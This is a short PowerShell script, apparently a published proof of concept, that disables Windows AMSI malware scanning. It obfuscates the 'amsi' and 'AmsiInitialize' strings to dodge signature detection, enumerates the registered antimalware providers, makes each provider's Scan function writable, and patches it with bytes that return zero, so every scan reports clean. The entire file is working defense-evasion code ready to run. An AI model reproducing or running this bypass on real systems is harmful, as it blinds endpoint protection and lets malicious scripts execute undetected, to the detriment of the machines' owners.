
Write-Host "Author: Maor Korkos (@maorkor)"

$bypass = "am"+"si" -Join ''
$biosProvider = "Ams"+"iIni"+"tialize" -join ''

$Apis = @"
using System;
using System.Runtime.InteropServices;

public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("$bypass")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@


Add-Type $Apis
$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0
$i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::$biosProvider("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

# Loop through all the providers
While($AntimalwareProvider -ne 0)
{
  # Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  # Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}